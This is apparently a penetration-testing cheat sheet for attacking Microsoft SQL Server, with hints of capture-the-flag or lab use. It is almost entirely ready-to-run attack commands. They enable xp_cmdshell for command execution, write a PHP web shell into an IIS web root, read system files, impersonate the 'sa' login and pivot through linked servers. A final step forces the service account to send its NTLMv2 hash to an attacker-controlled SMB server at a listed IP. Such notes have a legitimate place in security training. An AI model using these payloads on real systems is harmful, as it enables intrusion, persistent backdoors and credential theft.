# MSSQL

## Recon

```sh
msfconsole
use scanner/mssql/mssql_ping
set RHOST $target
run
```

## Connect

### `sqlcmd`

Connect to server `-S` `SQL01`, use database `-d` `somedb`

```powershell
sqlcmd -S 'SQL01' -U 'thomas' -P 'TopSecretPassword23!' -d somedb -W
```

### `mssqlclient`

```sh
impacket-mssqlclient "$user:$pass@$target"
```

### `sqsh`

```sh
sqsh -S $target -U "$user" -P "$pass"
```

## Common commands

```sql
-- Show all db
SELECT name FROM master.dbo.sysdatabases
GO
-- Choose a db
USE htbusers
GO
-- Show tables in selected db
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
GO
-- Show all data in a table
SELECT * FROM users
GO
```

## Code execution

### `impacket-mssqlclient`

Enable code execution

```
enable_xp_cmdshell
```

Code execution

```
exec xp_cmdshell 'type \SQL2019\ExpressAdv_ENU\sql-Configuration.ini'
```

### `sqsh`

Enable code execution

```mssql
EXECUTE sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO

EXECUTE sp_configure 'xp_cmdshell', 1
GO

RECONFIGURE
GO
```

Code execution

```mssql
xp_cmdshell 'whoami'
GO
```

## Write Local Files

Enable write local file

```mssql
sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO

sp_configure 'Ole Automation Procedures', 1
GO

RECONFIGURE
GO
```

Write local file

```mssql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

## Read local file

```mssql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

## Impersonate to another account

### List all accounts we can use

```mssql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
GO
```

### Impersonate

```mssql
EXECUTE AS LOGIN = 'sa'
GO
```

### Verify 'sysadmin' privilege

```mssql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

## Communicate with Other Databases

>`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

### Identify linked Servers

```mssql
SELECT srvname, isremote FROM sysservers
GO
```

### Verify service account privilege at linked server

```mssql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```

```
execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv];
```

## Capture hash

>We can steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures. When we use one of these and point it to our SMB server, the MSSQL service account will be forced to authenticate and send the NTLMv2 hash.
### Setup

```sh
responder -I <interface>
```

Or impacket, if only need smb

```sh
rm -rf mkdir /tmp/smb; mkdir /tmp/smb
sudo impacket-smbserver share /tmp/smb -smb2support
```

The IP is attacker's ip

```mssql
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
```